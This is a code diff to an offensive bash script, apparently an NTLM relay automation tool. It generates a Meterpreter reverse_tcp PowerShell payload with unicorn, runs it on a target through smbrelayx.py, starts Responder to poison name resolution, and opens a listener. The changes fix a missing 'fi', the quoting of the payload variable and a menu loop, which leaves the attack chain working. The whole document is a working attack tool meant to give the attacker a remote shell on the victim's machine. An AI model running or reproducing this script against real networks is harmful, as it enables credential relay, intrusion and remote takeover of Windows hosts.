@@ -104,6 +104,7 @@ elif [ "$select" = "2" ]; then
   echo ""
   echo "Please enter port for reverse connection"
   echo -ne ">"; read lport
+fi
 
 echo "Generating Payload..."
 python unicorn/unicorn.py windows/meterpreter/reverse_tcp $lhost $lport
@@ -111,7 +112,7 @@ payload=$(cat powershell_attack.txt)
 echo "Payload created"
 echo "Starting SMBRelayX..."
 
-smbrelayx.py -h $target -c '$payload'  >> ./relayer.log  &
+smbrelayx.py -h $target -c "$payload"  >> ./relayer.log  &
 sleep 2
 
 echo ""
@@ -121,6 +122,7 @@ iface=$(netstat -i | cut -d ' ' -f1 | sed 1,2d)
 select netiface in $iface ; do
 echo "Starting Responder on $netiface..."
 responder -I $netiface -wrfF >>relayer.log &
+break
 
 echo "Setting up listener..."
 
